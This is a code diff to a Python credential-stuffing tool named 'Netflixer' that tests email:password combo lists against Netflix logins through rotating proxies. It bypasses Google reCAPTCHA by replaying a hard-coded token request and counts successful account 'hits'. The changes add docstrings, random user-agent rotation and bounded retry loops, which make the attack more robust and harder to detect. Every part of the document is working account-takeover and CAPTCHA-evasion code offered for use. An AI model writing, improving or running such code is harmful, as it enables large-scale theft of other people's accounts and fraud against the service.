@@ -2,6 +2,8 @@ import os, re, time, random, threading, requests, easygui, datefinder
 from colorama import Fore
 from bs4 import BeautifulSoup
 
+from user_agent.user_agent import UserAgentGenerator
+
 # Credit to Pycenter by billythegoat356
 # Github: https://github.com/billythegoat356/pycenter/
 # License: https://github.com/billythegoat356/pycenter/blob/main/LICENSE
@@ -24,8 +26,14 @@ class Netflixer:
         self.cpm = 0
         self.retries = 0
         self.lock = threading.Lock()
+        self.ua_generator = UserAgentGenerator()
+
 
     def ui(self):
+        """
+        Displays the user interface for the Netflixer tool, including a title and a welcome message.
+        This method clears the terminal screen and prints a stylized title along with the GitHub link.
+        """
         os.system("cls && title [NETFLIXER] - Made by Plasmonix")
         text = """
             
@@ -50,6 +58,10 @@ class Netflixer:
         print(center(f"{Fore.LIGHTYELLOW_EX}\ngithub.com/Plasmonix\n{Fore.RESET}"))
 
     def cpmCounter(self):
+        """
+        Continuously updates the logins per minute (CPM) counter.
+        This method runs in a separate thread and updates the CPM every 4 seconds based on the number of hits.
+        """
         while True:
             old = self.hits
             time.sleep(4)
@@ -57,6 +69,10 @@ class Netflixer:
             self.cpm = (new - old) * 15
 
     def updateTitle(self):
+        """
+        Updates the terminal window title with the current statistics of the Netflixer tool.
+        This method runs in a separate thread and updates the title every 0.4 seconds with hits, bad attempts, retries, CPM, thread count, and elapsed time.
+        """
         while True:
             elapsed = time.strftime("%H:%M:%S", time.gmtime(time.time() - self.start))
             os.system(
@@ -65,6 +81,12 @@ class Netflixer:
             time.sleep(0.4)
 
     def getProxies(self):
+        """
+        Prompts the user to select a proxy file and loads the proxies into the instance.
+        
+        Raises:
+            SystemExit: If the proxy file cannot be opened or if the user input is invalid.
+        """
         try:
             print(f"[{Fore.LIGHTBLUE_EX}>{Fore.RESET}] Path to proxy file> ")
             path = easygui.fileopenbox(
@@ -118,6 +140,12 @@ class Netflixer:
             quit()
 
     def getCombos(self):
+        """
+        Prompts the user to select a combo list file and loads the email:password combinations into the instance.
+        
+        Raises:
+            SystemExit: If the combo file cannot be opened.
+        """
         try:
             print(f"[{Fore.LIGHTBLUE_EX}>{Fore.LIGHTWHITE_EX}] Path to combolist> ")
             path = easygui.fileopenbox(
@@ -135,27 +163,48 @@ class Netflixer:
             quit()
 
     def getauthURL(self):
-        try:
-            login = requests.get(
-                "https://www.netflix.com/login",
-                headers={"user-agent": random.choice(self.user_agents)},
-                proxies=random.choice(self.proxies),
-            )
-            authURL = re.search(
-                r'<input[^>]*name="authURL"[^>]*value="([^"]*)"', login.text
-            ).group(1)
-        except:
-            self.lock.acquire()
-            print(
-                f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Proxy timeout. Change your proxies or use a different VPN"
-            )
-            self.retries += 1
-            self.lock.release()
-            self.getauthURL()
-
-        return authURL
+        """
+        Retrieves the authentication URL required for logging into Netflix.
+        
+        Returns:
+            str: The authentication URL extracted from the Netflix login page.
+        
+        Raises:
+            Exception: If the proxy times out after multiple attempts.
+        """
+        max_attempts = 5  # Set a maximum number of retry attempts
+        for attempt in range(max_attempts):
+            try:
+                login = requests.get(
+                    "https://www.netflix.com/login",
+                    headers={"user-agent": self.ua_generator.get_random_user_agent()},
+                    proxies=random.choice(self.proxies),
+                )
+                authURL = re.search(
+                    r'<input[^>]*name="authURL"[^>]*value="([^"]*)"', login.text
+                ).group(1)
+                return authURL  # Return the authURL if successful
+            except:
+                self.lock.acquire()
+                print(
+                    f"[{Fore.LIGHTRED_EX}!{Fore.RESET}] {Fore.LIGHTRED_EX}ERROR{Fore.RESET} | Proxy timeout. Change your proxies or use a different VPN"
+                )
+                self.retries += 1
+                self.lock.release()
+                if attempt == max_attempts - 1:
+                    raise Exception("Failed to retrieve authURL after multiple attempts.")
+                time.sleep(2)  # Optional: wait before retrying
 
     def extract_date(self, input_string):
+        """
+        Extracts the most relevant date from a given string using datefinder.
+        
+        Parameters:
+            input_string (str): The string from which to extract the date.
+        
+        Returns:
+            str: The extracted date in the format "dd Month YYYY", or None if no date is found.
+        """
         dates = list(datefinder.find_dates(input_string))
         return (
             max(dates, default=None, key=lambda d: len(str(d))).strftime("%d %B %Y")
@@ -164,75 +213,89 @@ class Netflixer:
         )
 
     def bypass_captcha(self):
-        try:
-            req = requests.get(
-                "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=eeb8u2c3dizw",
-                headers={
-                    "Accept": "*/*",
-                    "Pragma": "no-cache",
-                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
-                },
-                
-            )
-            token = "".join(
-                re.findall(
-                    'type="hidden" id="recaptcha-token" value="(.*?)"', str(req.text)
+        """
+        Handles the CAPTCHA bypassing process by interacting with Google's reCAPTCHA service.
+        
+        Returns:
+            str: The CAPTCHA response token.
+        
+        Raises:
+            Exception: If the CAPTCHA bypass fails after multiple attempts.
+        """
+        max_attempts = 3
+        for attempt in range(max_attempts):
+            try:
+                req = requests.get(
+                    "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=eeb8u2c3dizw",
+                    headers={
+                        "Accept": "*/*",
+                        "Pragma": "no-cache",
+                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
+                    },
+                    
                 )
-            )
-            headers = {
-                "accept": "*/*",
-                "accept-encoding": "gzip, deflate, br",
-                "accept-language": "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
-                "origin": "https://www.google.com",
-                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
-                "Pragma": "no-cache",
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-origin",
-                "referer": "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=eeb8u2c3dizw ",
-            }
-            data = {
-                "v": "Km9gKuG06He-isPsP6saG8cn",
-                "reason": "q",
-                "c": token,
-                "k": "6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp",
-                "co": "aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz",
-                "chr": "%5B38%2C84%2C94%5D",
-                "vh": "-1149792284",
-                "bg": "kJaglpMKAAQeH2NlbQEHDwG3HgHkYmipwKZLvmAaGCIeO2knGyVi2lcc2d6we_IGLhXPTCrcRQSrXqn4n0doqzQ2i8Aw3_eUeSUIgbovYaDXYEy1YBiouAQe5rUbIuXh6jLItmtbpiCsvNHrJfqr1eDApuNn8jqVtZfpo12Bpl28T4S-BN-zefP60wgs4AhJqZMbHngai-9VnGYfde5EihgOR2s5FgJjWkNW4g7J4VixwycoKpPM_VkmmY-Mcl6SI4svUrXzKNBLbPXY0Zjp5cLyEh7O1UTPCe8OPj0cg6S7xPPpkZR9zKmDhy5adr982aTJZTFmV8R1p1OcDmT78D03ZgPRwzgoK_IpSvgrM-IPQfE_Qu-7zclFDMSkBPLUj1VxaolIdknp8Ap7AGfixtbK4_kZuDl853ea737GPv2dppnZdXciU8rN2RJXyhjWWDYOYIxnlqfzefYHNZsxmujutGJevWfWU_4tAMie6uvg1HXDF0BDj_s9H8UE8Gykb6M3qQVt12JCK_EBcmbrg8CiT_MK4L_ys7phshwm6-9Cy5YFQ3hS9oxYO-SSDY2r9QiNXDgccVpQ528Nf7V0gG3Z9xHJVmLpwpwB_F_L6dREoaPX_UnxiJoOR1gkg04uS4BswFxmzOJpB45VKJvbaBENYQabVtIiKUhgVwiBYH7-9NHvlbuYcHtCLf6piKcmdKxQXBEjphi1HISp-nLa2bIA47mjNOylD9ZWOp05PMuPSUJxr9SUCQTym2nNLPiWj9tJkyUzy0UVi6_QSIX7vf5JaVGJB3zfs5fCXQmDC7VGPT40_sQEfxQuCRZ8y67Mq8R64OZtbnlHX7JWE80myuXHQue_EjMLCJlQbaGhEJxNF25XzzseCLgVwNNVG6uUjgq_2-BTuNdyHd38y1hcsryXqaskJ2DsFh3P0mbHxE8viABVpzBWtSRjkH_OPXa_dus8OCqQI8I60lPXJ9lWU9aCMeAkD5T6VIfFvqCXZ_bfuX7ugp9ADo5bkFcSnQJrmAobrmuOHh3zvIZmIHr4hZ7jsH_ANy_w6JNSsbifs2-BA45a7crLyEC1tuFq_yvCXR-fH3F8uSoVobZK1MreQuW_8zBrI1w1vwb7-2teKDEK41orAry1P7ib-fzo08KiPvPDJ3MQi3XQeOzAcQwRjhRNDbtAcDE-XRSkN_CsRg9dmygO-wwM7X607rH-RvNw-CBjt_pB4V-xd83GKtfI7VZZ48iNywixzOoIPsNv2_oqLHNGSc9gvMNtegcNKU7UtUiiZR5sIps",
-                "size": "invisible",
-                "hl": "en",
-                "cb": "eeb8u2c3dizw",
-            }
-            req = requests.post(
-                "https://www.google.com/recaptcha/api2/reload?k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp",
-                headers=headers,
-                data=data,
-            )
-            captcha_token = "".join(re.findall('\["rresp","(.*?)"', str(req.text)))
-            return captcha_token
-        except:
-            self.bypass_captcha()
+                token = "".join(
+                    re.findall(
+                        'type="hidden" id="recaptcha-token" value="(.*?)"', str(req.text)
+                    )
+                )
+                headers = {
+                    "accept": "*/*",
+                    "accept-encoding": "gzip, deflate, br",
+                    "accept-language": "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
+                    "origin": "https://www.google.com",
+                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
+                    "Pragma": "no-cache",
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "same-origin",
+                    "referer": "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp&co=aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz&hl=en&v=Km9gKuG06He-isPsP6saG8cn&size=invisible&cb=eeb8u2c3dizw ",
+                }
+                data = {
+                    "v": "Km9gKuG06He-isPsP6saG8cn",
+                    "reason": "q",
+                    "c": token,
+                    "k": "6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp",
+                    "co": "aHR0cHM6Ly93d3cubmV0ZmxpeC5jb206NDQz",
+                    "chr": "%5B38%2C84%2C94%5D",
+                    "vh": "-1149792284",
+                    "bg": "kJaglpMKAAQeH2NlbQEHDwG3HgHkYmipwKZLvmAaGCIeO2knGyVi2lcc2d6we_IGLhXPTCrcRQSrXqn4n0doqzQ2i8Aw3_eUeSUIgbovYaDXYEy1YBiouAQe5rUbIuXh6jLItmtbpiCsvNHrJfqr1eDApuNn8jqVtZfpo12Bpl28T4S-BN-zefP60wgs4AhJqZMbHngai-9VnGYfde5EihgOR2s5FgJjWkNW4g7J4VixwycoKpPM_VkmmY-Mcl6SI4svUrXzKNBLbPXY0Zjp5cLyEh7O1UTPCe8OPj0cg6S7xPPpkZR9zKmDhy5adr982aTJZTFmV8R1p1OcDmT78D03ZgPRwzgoK_IpSvgrM-IPQfE_Qu-7zclFDMSkBPLUj1VxaolIdknp8Ap7AGfixtbK4_kZuDl853ea737GPv2dppnZdXciU8rN2RJXyhjWWDYOYIxnlqfzefYHNZsxmujutGJevWfWU_4tAMie6uvg1HXDF0BDj_s9H8UE8Gykb6M3qQVt12JCK_EBcmbrg8CiT_MK4L_ys7phshwm6-9Cy5YFQ3hS9oxYO-SSDY2r9QiNXDgccVpQ528Nf7V0gG3Z9xHJVmLpwpwB_F_L6dREoaPX_UnxiJoOR1gkg04uS4BswFxmzOJpB45VKJvbaBENYQabVtIiKUhgVwiBYH7-9NHvlbuYcHtCLf6piKcmdKxQXBEjphi1HISp-nLa2bIA47mjNOylD9ZWOp05PMuPSUJxr9SUCQTym2nNLPiWj9tJkyUzy0UVi6_QSIX7vf5JaVGJB3zfs5fCXQmDC7VGPT40_sQEfxQuCRZ8y67Mq8R64OZtbnlHX7JWE80myuXHQue_EjMLCJlQbaGhEJxNF25XzzseCLgVwNNVG6uUjgq_2-BTuNdyHd38y1hcsryXqaskJ2DsFh3P0mbHxE8viABVpzBWtSRjkH_OPXa_dus8OCqQI8I60lPXJ9lWU9aCMeAkD5T6VIfFvqCXZ_bfuX7ugp9ADo5bkFcSnQJrmAobrmuOHh3zvIZmIHr4hZ7jsH_ANy_w6JNSsbifs2-BA45a7crLyEC1tuFq_yvCXR-fH3F8uSoVobZK1MreQuW_8zBrI1w1vwb7-2teKDEK41orAry1P7ib-fzo08KiPvPDJ3MQi3XQeOzAcQwRjhRNDbtAcDE-XRSkN_CsRg9dmygO-wwM7X607rH-RvNw-CBjt_pB4V-xd83GKtfI7VZZ48iNywixzOoIPsNv2_oqLHNGSc9gvMNtegcNKU7UtUiiZR5sIps",
+                    "size": "invisible",
+                    "hl": "en",
+                    "cb": "eeb8u2c3dizw",
+                }
+                req = requests.post(
+                    "https://www.google.com/recaptcha/api2/reload?k=6LeDeyYaAAAAABFLwg58qHaXTEuhbrbUq8nDvOCp",
+                    headers=headers,
+                    data=data,
+                )
+                captcha_token = "".join(re.findall('\["rresp","(.*?)"', str(req.text)))
+                return captcha_token
+            except Exception as e:
+                if attempt == max_attempts - 1:
+                    raise Exception(f"CAPTCHA bypass failed after {max_attempts} attempts: {str(e)}")
+                else:
+                    print(f"CAPTCHA bypass attempt {attempt + 1} failed. Retrying...")
+                    time.sleep(2)  # Wait for 2 seconds before retrying
 
     def checker(self, email, password):
+        """
+        Attempts to log in to Netflix using the provided email and password.
+        
+        Parameters:
+            email (str): The email address to use for login.
+            password (str): The password to use for login.
+        
+        Raises:
+            requests.exceptions.RequestException: If there is a network-related error during the login attempt.
+        """
         try:
             client = requests.Session()
-            self.user_agents = [
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-                "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
-                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
-                "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
-                "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
-            ]
+
+            user_agent = self.ua_generator.get_random_user_agent()
 
             headers = {
-                "User-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                "User-agent": user_agent,
                 "Accept-language": "en-US,en;q=0.9",
                 "Accept-encoding": "gzip, deflate, br",
                 "Referer": "https://www.netflix.com/login",
@@ -273,7 +336,7 @@ class Netflixer:
                         "Accept-Encoding": "gzip, deflate, br",
                         "Accept-Language": "en-US,en;q=0.9",
                         "Referer": "https://www.netflix.com/browse",
-                        "User-Agent": random.choice(self.user_agents),
+                        "User-Agent": user_agent,
                     },
                     cookies=cookie,
                     proxies=random.choice(self.proxies),
@@ -323,6 +386,7 @@ class Netflixer:
             )
             self.retries += 1
             self.lock.release()
+
         except Exception as e:
             self.lock.acquire()
             print(
@@ -332,12 +396,23 @@ class Netflixer:
             self.lock.release()
 
     def worker(self, combos, thread_id):
+        """
+        Processes a subset of email:password combinations in a separate thread.
+        
+        Parameters:
+            combos (list): The list of email:password combinations to check.
+            thread_id (int): The ID of the thread for tracking progress.
+        """
         while self.check[thread_id] < len(combos):
             combination = combos[self.check[thread_id]].split(":")
             self.checker(combination[0], combination[1])
             self.check[thread_id] += 1
 
     def main(self):
+        """
+        The main entry point for the Netflixer tool. It orchestrates the user interface, proxy and combo loading,
+        thread management, and the overall login checking process.
+        """
         self.ui()
         self.getProxies()
         self.getCombos()
